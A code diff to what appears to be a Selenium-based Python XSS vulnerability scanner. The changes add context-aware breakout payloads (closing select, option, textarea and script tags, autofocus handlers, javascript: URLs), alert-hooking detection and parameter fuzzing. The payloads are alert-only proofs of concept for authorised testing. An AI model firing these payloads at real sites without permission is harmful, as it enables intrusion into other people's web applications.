@@ -23,13 +23,18 @@ import re
 
 class XSSScanner:
     def __init__(self, target_url: str, max_threads: int = 10, depth: int = 3, payloads_file: str = "payloads.json"):
+        # Setup logging FIRST
+        logging.basicConfig(level=logging.INFO, 
+                          format='%(asctime)s - %(levelname)s - %(message)s')
+        self.logger = logging.getLogger(__name__)
+        
         self.target_url = target_url
         self.base_domain = urlparse(target_url).netloc
         self.max_threads = max_threads
         self.depth = depth
         self.crawled_urls = set()
         self.vulnerable_urls = []
-        self.forms_found = []
+        self.forms_found = set()  # Changed to set to avoid issues
         self.ajax_endpoints = set()
         self.scan_results = {
             'reflected_xss': [],
@@ -40,7 +45,7 @@ class XSSScanner:
         self.url_queue = Queue()
         self.lock = threading.Lock()
         
-        # Load payloads from external file
+        # Load payloads from external file (after logger is initialized)
         self.xss_payloads = self.load_payloads(payloads_file)
         
         # Common parameter names for XSS testing
@@ -48,7 +53,8 @@ class XSSScanner:
             'search', 'q', 'query', 'term', 'keyword', 'input', 'data',
             'text', 'message', 'comment', 'content', 'name', 'value',
             'id', 'page', 'url', 'redirect', 'return', 'callback', 'filter',
-            'sort', 'order', 'category', 'tag', 'type', 'action', 'cmd'
+            'sort', 'order', 'category', 'tag', 'type', 'action', 'cmd',
+            'storeId', 'productId', 'userId', 'sessionId', 'token'
         ]
         
         # DOM XSS sources and sinks
@@ -57,19 +63,59 @@ class XSSScanner:
             'location.href', 'location.search', 'location.hash',
             'document.referrer', 'window.name', 'document.cookie',
             'localStorage', 'sessionStorage', 'history.pushState',
-            'history.replaceState', 'postMessage'
+            'history.replaceState', 'postMessage', 'document.domain'
         ]
         
         self.dom_sinks = [
             'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
             'eval', 'setTimeout', 'setInterval', 'Function', 'execScript',
-            'msSetImmediate', 'setImmediate', 'execCommand'
+            'msSetImmediate', 'setImmediate', 'execCommand', 'insertAdjacentHTML',
+            'jQuery.html', '$.html', 'element.html'
         ]
         
-        # Setup logging
-        logging.basicConfig(level=logging.INFO, 
-                          format='%(asctime)s - %(levelname)s - %(message)s')
-        self.logger = logging.getLogger(__name__)
+        # Context-aware payloads for breaking out of different HTML contexts
+        self.context_payloads = {
+            'select_element': [
+                "</select><script>alert('DOM-XSS')</script>",
+                "</select><img src=x onerror=alert('DOM-XSS')>",
+                '</select><svg onload=alert("DOM-XSS")>',
+                "</option></select><script>alert('DOM-XSS')</script>"
+            ],
+            'option_element': [
+                '</option><script>alert("DOM-XSS")</script>',
+                '</option><img src=x onerror=alert("DOM-XSS")>',
+                '</option></select><script>alert("DOM-XSS")</script>'
+            ],
+            'input_value': [
+                '" autofocus onfocus=alert("DOM-XSS") x="',
+                "' autofocus onfocus=alert('DOM-XSS') x='",
+                '"><script>alert("DOM-XSS")</script><input x="',
+                "'><script>alert('DOM-XSS')</script><input x='"
+            ],
+            'textarea': [
+                '</textarea><script>alert("DOM-XSS")</script>',
+                '</textarea><img src=x onerror=alert("DOM-XSS")>'
+            ],
+            'script_context': [
+                '";alert("DOM-XSS");//',
+                "';alert('DOM-XSS');//",
+                '</script><script>alert("DOM-XSS")</script>'
+            ],
+            'url_context': [
+                'javascript:alert("DOM-XSS")',
+                'data:text/html,<script>alert("DOM-XSS")</script>',
+                'vbscript:alert("DOM-XSS")'
+            ],
+            'general': [
+                '<script>alert("DOM-XSS")</script>',
+                '<img src=x onerror=alert("DOM-XSS")>',
+                '<svg onload=alert("DOM-XSS")>',
+                '<iframe src=javascript:alert("DOM-XSS")></iframe>',
+                '<body onload=alert("DOM-XSS")>',
+                '<details open ontoggle=alert("DOM-XSS")>',
+                '<marquee onstart=alert("DOM-XSS")>'
+            ]
+        }
 
     def load_payloads(self, payloads_file: str) -> Dict:
         """Load payloads from external JSON file"""
@@ -87,7 +133,7 @@ class XSSScanner:
             return self.get_default_payloads()
 
     def get_default_payloads(self) -> Dict:
-        """Fallback default payloads if file not found"""
+        """Enhanced default payloads"""
         return {
             'reflected_xss': {
                 'basic': [
@@ -95,14 +141,20 @@ class XSSScanner:
                     "<img src=x onerror=alert('XSS')>",
                     "<svg onload=alert('XSS')>",
                     "javascript:alert('XSS')",
-                    "<iframe src=javascript:alert('XSS')></iframe>"
+                    "<iframe src=javascript:alert('XSS')></iframe>",
+                    '"><script>alert("XSS")</script>',
+                    "'><script>alert('XSS')</script>",
+                    '"><img src=x onerror=alert("XSS")>'
                 ]
             },
             'dom_xss': {
                 'basic': [
                     "<script>alert('DOM-XSS')</script>",
                     "<img src=x onerror=alert('DOM-XSS')>",
-                    "<svg onload=alert('DOM-XSS')>"
+                    "<svg onload=alert('DOM-XSS')>",
+                    "</select><script>alert('DOM-XSS')</script>",
+                    '</option><script>alert("DOM-XSS")</script>',
+                    '" autofocus onfocus=alert("DOM-XSS") x="'
                 ]
             },
             'stored_xss': {
@@ -126,10 +178,32 @@ class XSSScanner:
         options.add_argument('--allow-running-insecure-content')
         options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
         
-        driver = webdriver.Chrome(options=options)
-        driver.set_page_load_timeout(30)
-        driver.implicitly_wait(5)
-        return driver
+        try:
+            driver = webdriver.Chrome(options=options)
+            driver.set_page_load_timeout(30)
+            driver.implicitly_wait(5)
+            
+            # Inject alert detection script
+            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
+                'source': '''
+                    window.__originalAlert = window.alert;
+                    window.__alertTriggered = false;
+                    window.alert = function(msg) {
+                        window.__alertTriggered = true;
+                        window.__alertMessage = msg;
+                        console.log('XSS Alert triggered:', msg);
+                    };
+                '''
+            })
+            
+            return driver
+        except Exception as e:
+            self.logger.error(f"Error creating WebDriver: {str(e)}")
+            # Fallback without CDP
+            driver = webdriver.Chrome(options=options)
+            driver.set_page_load_timeout(30)
+            driver.implicitly_wait(5)
+            return driver
 
     def is_valid_url(self, url: str) -> bool:
         """Check if URL is valid for testing"""
@@ -164,7 +238,7 @@ class XSSScanner:
             # Test search functionality if present
             self.test_search_forms(driver, url, found_urls)
             
-            # Find all interactive elements
+            # Find all interactive elements and URLs
             interactive_selectors = [
                 "a[href]", "button", "input[type='submit']", "input[type='button']", 
                 "[onclick]", "[onchange]", "[onsubmit]", "form", 
@@ -195,8 +269,15 @@ class XSSScanner:
             for form in forms:
                 form_data = self.extract_form_data(form, url)
                 if form_data:
-                    self.forms_found.append(form_data)
-                    found_urls.add(form_data['action'])
+                    # Convert to JSON string for hashing
+                    form_json = json.dumps(form_data, sort_keys=True)
+                    self.forms_found.add(form_json)
+                    if 'action' in form_data:
+                        found_urls.add(form_data['action'])
+            
+            # Extract all URLs from current page for parameter fuzzing
+            page_urls = self.extract_urls_from_page(driver, url)
+            found_urls.update(page_urls)
             
         except Exception as e:
             self.logger.error(f"Error in AJAX spidering {url}: {str(e)}")
@@ -204,6 +285,39 @@ class XSSScanner:
             driver.quit()
             
         return found_urls
+
+    def extract_urls_from_page(self, driver, base_url: str) -> Set[str]:
+        """Extract all URLs from the current page for parameter testing"""
+        urls = set()
+        try:
+            # Get all links
+            links = driver.find_elements(By.TAG_NAME, "a")
+            for link in links:
+                href = link.get_attribute("href")
+                if href and self.is_valid_url(href) and self.is_same_domain(href):
+                    urls.add(href)
+                    # Add parameter variations
+                    parsed = urlparse(href)
+                    if parsed.query:
+                        # Add variations for existing parameters
+                        params = parse_qs(parsed.query, keep_blank_values=True)
+                        for param in params.keys():
+                            test_params = params.copy()
+                            test_params[param] = ['test']
+                            new_query = urlencode(test_params, doseq=True)
+                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
+                                                 parsed.params, new_query, parsed.fragment))
+                            urls.add(test_url)
+            
+            # Add common parameter testing URLs for the current page
+            for param in self.common_params[:10]:  # Test more common params
+                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}=test"
+                urls.add(test_url)
+                
+        except Exception as e:
+            self.logger.debug(f"Error extracting URLs from page: {str(e)}")
+            
+        return urls
 
     def test_search_forms(self, driver, base_url: str, found_urls: Set[str]):
         """Test search forms on the page"""
@@ -246,7 +360,7 @@ class XSSScanner:
         parsed_url = urlparse(base_url)
         
         # Add common parameters for testing
-        for param in self.common_params[:5]:
+        for param in self.common_params[:10]:  # Test more params
             if '?' in base_url:
                 test_url = f"{base_url}&{param}=test"
             else:
@@ -318,7 +432,7 @@ class XSSScanner:
         
         # Test URL with common parameters if no existing parameters
         else:
-            for param_name in self.common_params[:3]:
+            for param_name in self.common_params[:5]:
                 test_params = {param_name: ['test']}
                 test_url = f"{url}?{param_name}=test"
                 vulnerabilities.extend(self.test_url_parameters(test_url, test_params))
@@ -441,7 +555,7 @@ class XSSScanner:
         return vulnerabilities
 
     def test_dom_xss(self, url: str) -> List[Dict]:
-        """Enhanced DOM-based XSS testing"""
+        """Enhanced DOM-based XSS testing with context-aware payloads"""
         vulnerabilities = []
         
         if not self.is_valid_url(url):
@@ -451,101 +565,211 @@ class XSSScanner:
         dom_payloads = self.xss_payloads.get('dom_xss', {})
         
         try:
-            # Test 1: Fragment-based DOM XSS
-            for payload_category, payloads in dom_payloads.items():
-                for payload in payloads[:3]:  # Limit payloads
-                    test_urls = [
-                        f"{url}#{payload}",
-                        f"{url}#section={payload}",
-                        f"{url}#data={payload}",
-                        f"{url}?fragment={payload}"
-                    ]
-                    
-                    for test_url in test_urls:
-                        try:
-                            driver.get(test_url)
-                            time.sleep(3)  # Wait for DOM processing
-                            
-                            # Check for JavaScript execution indicators
-                            execution_indicators = [
-                                # Check if our payload executed
-                                f"alert('DOM-XSS')",
-                                f"alert(\"DOM-XSS\")",
-                                # Check if payload is in DOM
-                                payload
-                            ]
-                            
-                            page_source = driver.page_source
-                            current_url = driver.current_url
-                            
-                            # Method 1: Check if payload appears in DOM unescaped
-                            if payload in page_source and not self.is_payload_escaped(page_source, payload):
-                                # Method 2: Check for DOM manipulation via JavaScript
-                                dom_check_script = f"""
-                                var found = false;
-                                var sources = {json.dumps(self.dom_sources)};
-                                var sinks = {json.dumps(self.dom_sinks)};
-                                
-                                // Check if URL hash/search is being used unsafely
-                                if (location.hash.indexOf('{payload.replace("'", "\\'")}') !== -1 ||
-                                    location.search.indexOf('{payload.replace("'", "\\'")}') !== -1) {{
-                                    
-                                    // Check if any dangerous sinks are present in the page
-                                    var scripts = document.getElementsByTagName('script');
-                                    for (var i = 0; i < scripts.length; i++) {{
-                                        var scriptContent = scripts[i].innerHTML;
-                                        for (var j = 0; j < sinks.length; j++) {{
-                                            if (scriptContent.indexOf(sinks[j]) !== -1) {{
-                                                found = true;
-                                                break;
-                                            }}
-                                        }}
-                                        if (found) break;
-                                    }}
-                                }}
-                                
-                                return {{
-                                    found: found,
-                                    hash: location.hash,
-                                    search: location.search,
-                                    payloadInUrl: location.href.indexOf('{payload.replace("'", "\\'")}') !== -1
-                                }};
-                                """
-                                
-                                try:
-                                    dom_result = driver.execute_script(dom_check_script)
-                                    
-                                    if (dom_result.get('found') or 
-                                        dom_result.get('payloadInUrl') or 
-                                        self.detect_dom_manipulation(driver, payload)):
-                                        
-                                        vulnerability = {
-                                            'type': 'DOM-based XSS',
-                                            'url': test_url,
-                                            'parameter': 'fragment/url',
-                                            'payload': payload,
-                                            'payload_category': payload_category,
-                                            'method': 'GET',
-                                            'evidence': f"Payload found in DOM context, potential execution vector detected",
-                                            'dom_result': dom_result
-                                        }
-                                        vulnerabilities.append(vulnerability)
-                                        self.logger.info(f"🚨 DOM XSS found: {test_url}")
-                                        return vulnerabilities
-                                        
-                                except Exception as e:
-                                    self.logger.debug(f"DOM check script error: {str(e)}")
-                                    
-                        except Exception as e:
-                            self.logger.debug(f"Error testing DOM XSS: {str(e)}")
-                            continue
-                            
+            # Get all payloads including context-specific ones
+            all_payloads = []
+            for category_payloads in dom_payloads.values():
+                all_payloads.extend(category_payloads)
+            
+            # Add context-aware payloads
+            for context_payloads in self.context_payloads.values():
+                all_payloads.extend(context_payloads)
+            
+            parsed_url = urlparse(url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+            
+            # Test 1: URL Parameters
+            if parsed_url.query:
+                params = parse_qs(parsed_url.query, keep_blank_values=True)
+                # Test each parameter individually
+                for param_name in params.keys():
+                    for payload in all_payloads[:15]:  # Limit payloads per param
+                        test_params = params.copy()
+                        test_params[param_name] = [payload]
+                        test_url = base_url + '?' + urlencode(test_params, doseq=True)
+                        
+                        vuln = self.check_dom_vulnerability(driver, test_url, param_name, payload)
+                        if vuln:
+                            vulnerabilities.append(vuln)
+                            return vulnerabilities  # Return on first finding
+            
+            # Test 2: Common parameters even if not in original URL
+            for param_name in self.common_params[:8]:
+                for payload in all_payloads[:10]:
+                    test_url = f"{base_url}?{param_name}={payload}"
+                    vuln = self.check_dom_vulnerability(driver, test_url, param_name, payload)
+                    if vuln:
+                        vulnerabilities.append(vuln)
+                        return vulnerabilities
+            
+            # Test 3: Fragment/Hash-based XSS
+            for payload in all_payloads[:15]:
+                test_url = f"{url}#{payload}"
+                vuln = self.check_dom_vulnerability(driver, test_url, 'fragment', payload, is_fragment=True)
+                if vuln:
+                    vulnerabilities.append(vuln)
+                    return vulnerabilities
+            
+            # Test 4: URL with specific context payloads for document.write scenarios
+            specific_payloads = [
+                "</select><script>alert('DOM-XSS')</script>",
+                '</option><script>alert("DOM-XSS")</script>',
+                '" autofocus onfocus=alert("DOM-XSS") x="',
+                "' autofocus onfocus=alert('DOM-XSS') x='",
+                '</textarea><script>alert("DOM-XSS")</script>',
+                '";alert("DOM-XSS");//',
+                "';alert('DOM-XSS');//"
+            ]
+            
+            for param_name in ['storeId', 'productId', 'search', 'q']:
+                for payload in specific_payloads:
+                    test_url = f"{base_url}?{param_name}={payload}"
+                    vuln = self.check_dom_vulnerability(driver, test_url, param_name, payload)
+                    if vuln:
+                        vulnerabilities.append(vuln)
+                        return vulnerabilities
+                        
         except Exception as e:
             self.logger.error(f"Error in DOM XSS testing: {str(e)}")
         finally:
             driver.quit()
             
         return vulnerabilities
+
+    def check_dom_vulnerability(self, driver, test_url: str, param_name: str, payload: str, is_fragment: bool = False) -> Optional[Dict]:
+        """Check if a specific URL/payload combination triggers DOM XSS"""
+        try:
+            driver.get(test_url)
+            time.sleep(2)  # Wait for DOM processing
+            
+            # Method 1: Check if alert was triggered
+            try:
+                alert_triggered = driver.execute_script('return window.__alertTriggered === true;')
+                if alert_triggered:
+                    return {
+                        'type': 'DOM-based XSS',
+                        'url': test_url,
+                        'parameter': param_name,
+                        'payload': payload,
+                        'method': 'GET',
+                        'evidence': 'JavaScript alert() function was executed - XSS confirmed',
+                        'confirmation': 'CONFIRMED'
+                    }
+            except:
+                pass
+            
+            # Method 2: Check page source for unescaped payload
+            page_source = driver.page_source.lower()
+            payload_lower = payload.lower()
+            
+            if payload_lower in page_source:
+                # Check if payload is properly escaped
+                if not self.is_payload_escaped(page_source, payload):
+                    # Look for dangerous contexts
+                    dangerous_contexts = self.analyze_payload_context(page_source, payload)
+                    if dangerous_contexts:
+                        return {
+                            'type': 'DOM-based XSS',
+                            'url': test_url,
+                            'parameter': param_name,
+                            'payload': payload,
+                            'method': 'GET',
+                            'evidence': f'Unescaped payload found in dangerous context: {dangerous_contexts}',
+                            'confirmation': 'LIKELY'
+                        }
+            
+            # Method 3: Check for DOM manipulation patterns
+            if self.check_dom_sinks(driver, payload, is_fragment):
+                return {
+                    'type': 'DOM-based XSS',
+                    'url': test_url,
+                    'parameter': param_name,
+                    'payload': payload,
+                    'method': 'GET',
+                    'evidence': 'Payload detected in DOM manipulation context',
+                    'confirmation': 'POSSIBLE'
+                }
+                
+        except Exception as e:
+            self.logger.debug(f"Error checking DOM vulnerability: {str(e)}")
+            
+        return None
+
+    def analyze_payload_context(self, page_source: str, payload: str) -> str:
+        """Analyze the context where payload appears in the page"""
+        try:
+            index = page_source.lower().find(payload.lower())
+            if index == -1:
+                return ""
+            
+            # Get context around the payload
+            start = max(0, index - 200)
+            end = min(len(page_source), index + len(payload) + 200)
+            context = page_source[start:end]
+            
+            dangerous_patterns = [
+                'document.write',
+                '<script',
+                'innerHTML',
+                'outerHTML',
+                '<select',
+                '<option',
+                '<input',
+                '<textarea',
+                'eval(',
+                'setTimeout(',
+                'setInterval('
+            ]
+            
+            found_patterns = []
+            for pattern in dangerous_patterns:
+                if pattern in context.lower():
+                    found_patterns.append(pattern)
+            
+            return ', '.join(found_patterns) if found_patterns else ""
+            
+        except:
+            return ""
+
+    def check_dom_sinks(self, driver, payload: str, is_fragment: bool) -> bool:
+        """Check for DOM XSS sinks that might process our payload"""
+        try:
+            # Check if payload appears in dangerous DOM contexts
+            check_script = f"""
+            var payload = '{payload.replace("'", "\\'")}';
+            var dangerous = false;
+            
+            // Check if payload is in URL and being processed
+            if (location.href.indexOf(payload) !== -1) {{
+                // Check for document.write usage
+                if (document.documentElement.innerHTML.indexOf('document.write') !== -1) {{
+                    dangerous = true;
+                }}
+                
+                // Check for innerHTML usage
+                if (document.documentElement.innerHTML.indexOf('innerHTML') !== -1) {{
+                    dangerous = true;
+                }}
+                
+                // Check for eval usage
+                if (document.documentElement.innerHTML.indexOf('eval') !== -1) {{
+                    dangerous = true;
+                }}
+            }}
+            
+            return {{
+                dangerous: dangerous,
+                payloadInUrl: location.href.indexOf(payload) !== -1,
+                hasDocWrite: document.documentElement.innerHTML.indexOf('document.write') !== -1,
+                hasInnerHTML: document.documentElement.innerHTML.indexOf('innerHTML') !== -1
+            }};
+            """
+            
+            result = driver.execute_script(check_script)
+            return result.get('dangerous', False)
+            
+        except Exception as e:
+            self.logger.debug(f"Error checking DOM sinks: {str(e)}")
+            return False
 
     def is_payload_escaped(self, html_content: str, payload: str) -> bool:
         """Check if payload is properly escaped in HTML"""
@@ -562,39 +786,11 @@ class XSSScanner:
             if char in payload and escaped in html_content:
                 return True
         
+        # Check if payload appears inside HTML comments or CDATA
+        if f'<!--{payload}-->' in html_content or f'<![CDATA[{payload}]]>' in html_content:
+            return True
+        
         return False
-
-    def detect_dom_manipulation(self, driver, payload: str) -> bool:
-        """Detect if DOM is being manipulated unsafely"""
-        try:
-            # Check for common DOM manipulation patterns
-            detection_script = """
-            var dangerous = false;
-            
-            // Check for innerHTML usage with location data
-            if (document.body.innerHTML.indexOf('innerHTML') !== -1 &&
-                (window.location.hash || window.location.search)) {
-                dangerous = true;
-            }
-            
-            // Check for document.write with location data
-            if (document.documentElement.outerHTML.indexOf('document.write') !== -1 &&
-                (window.location.hash || window.location.search)) {
-                dangerous = true;
-            }
-            
-            // Check for eval with location data
-            if (document.documentElement.outerHTML.indexOf('eval') !== -1 &&
-                (window.location.hash || window.location.search)) {
-                dangerous = true;
-            }
-            
-            return dangerous;
-            """
-            
-            return driver.execute_script(detection_script)
-        except:
-            return False
 
     def extract_evidence(self, response_text: str, payload: str) -> str:
         """Extract evidence of XSS vulnerability"""
@@ -648,7 +844,9 @@ class XSSScanner:
         # Display payload statistics
         total_payloads = sum(len(payloads) for category in self.xss_payloads.values() 
                            for payloads in category.values())
-        self.logger.info(f"🎯 Loaded {total_payloads} XSS payloads")
+        context_payloads = sum(len(payloads) for payloads in self.context_payloads.values())
+        total_payloads += context_payloads
+        self.logger.info(f"🎯 Loaded {total_payloads} XSS payloads (including context-aware)")
         
         # Phase 1: AJAX Spidering
         self.logger.info("📡 Phase 1: AJAX Spidering and URL Discovery")
@@ -663,7 +861,16 @@ class XSSScanner:
         for url in all_urls:
             self.url_queue.put(url)
         
-        self.logger.info(f"🕸️  Discovered {len(all_urls)} URLs and {len(self.forms_found)} forms")
+        # Convert forms_found set back to list for processing
+        forms_list = []
+        for form_json in self.forms_found:
+            try:
+                form_dict = json.loads(form_json)
+                forms_list.append(form_dict)
+            except:
+                continue
+        
+        self.logger.info(f"🕸️  Discovered {len(all_urls)} URLs and {len(forms_list)} forms")
         
         # Phase 2: Active Scanning with Multi-threading
         self.logger.info("🎯 Phase 2: Active XSS Scanning")
@@ -680,10 +887,10 @@ class XSSScanner:
             concurrent.futures.wait(url_futures, timeout=300)  # 5 min timeout
         
         # Scan forms for stored XSS
-        if self.forms_found:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=min(self.max_threads, len(self.forms_found))) as executor:
+        if forms_list:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=min(self.max_threads, len(forms_list))) as executor:
                 form_futures = []
-                for form_data in self.forms_found:
+                for form_data in forms_list:
                     future = executor.submit(self.scan_forms_worker, form_data)
                     form_futures.append(future)
                 
@@ -698,7 +905,7 @@ class XSSScanner:
             'target_url': self.target_url,
             'scan_duration': f"{scan_duration:.2f} seconds",
             'urls_crawled': len(self.crawled_urls),
-            'forms_found': len(self.forms_found),
+            'forms_found': len(forms_list),
             'ajax_endpoints': len(self.ajax_endpoints),
             'crawl_depth': self.depth,
             'payloads_used': total_payloads,
@@ -758,7 +965,7 @@ class XSSScanner:
         </head>
         <body>
             <div class="header">
-                <h1>🛡️ XSS Vulnerability Scanner Report</h1>
+                <h1>🛡️ Enhanced XSS Vulnerability Scanner Report</h1>
                 <p>Target: {target_url}</p>
                 <p>Scan Date: {scan_date}</p>
             </div>
@@ -816,14 +1023,22 @@ class XSSScanner:
             if self.scan_results[vuln_type]:
                 vuln_section += f"<div class='summary'><h2>{title}</h2>"
                 for vuln in self.scan_results[vuln_type]:
+                    confirmation_class = ""
+                    if vuln.get('confirmation') == 'CONFIRMED':
+                        confirmation_class = "vulnerability"
+                    elif vuln.get('confirmation') == 'LIKELY':
+                        confirmation_class = "vulnerability medium"
+                    else:
+                        confirmation_class = "vulnerability low"
+                        
                     vuln_section += f"""
-                    <div class="vulnerability">
-                        <h3>🚨 {vuln['type']} Found</h3>
+                    <div class="{confirmation_class}">
+                        <h3>🚨 {vuln['type']} Found {f"({vuln.get('confirmation', 'POSSIBLE')})" if vuln.get('confirmation') else ""}</h3>
                         <div class="details">
                             <p><strong>URL:</strong> {vuln['url']}</p>
                             <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                             <p><strong>Method:</strong> {vuln['method']}</p>
-                            <p><strong>Payload Category:</strong> {vuln.get('payload_category', 'N/A')}</p>
+                            <p><strong>Payload Category:</strong> {vuln.get('payload_category', 'Context-Aware')}</p>
                             <p><strong>Payload:</strong></p>
                             <div class="payload">{vuln['payload']}</div>
                             <p><strong>Evidence:</strong> {vuln['evidence']}</p>
@@ -837,7 +1052,7 @@ class XSSScanner:
             <div class="summary">
                 <div class="no-vulns">
                     <h2>🛡️ No Vulnerabilities Found</h2>
-                    <p>The scan did not identify any XSS vulnerabilities in the target application.</p>
+                    <p>The enhanced scan did not identify any XSS vulnerabilities in the target application.</p>
                     <p>This could mean the application is secure, or the vulnerabilities require different attack vectors.</p>
                 </div>
             </div>
@@ -866,7 +1081,7 @@ class XSSScanner:
 def get_user_input():
     """Get user input for scanner configuration"""
     print("\n" + "="*60)
-    print("    🛡️  ADVANCED XSS VULNERABILITY SCANNER")
+    print("    🛡️  ENHANCED XSS VULNERABILITY SCANNER")
     print("="*60)
     
     # Get target URL
@@ -943,7 +1158,7 @@ if __name__ == "__main__":
             payloads_file="payloads.json"
         )
         
-        print(f"\n🚀 Starting advanced XSS scan...")
+        print(f"\n🚀 Starting enhanced XSS scan...")
         print("⚠️  Make sure you have permission to scan the target website!")
         
         # Run the scan
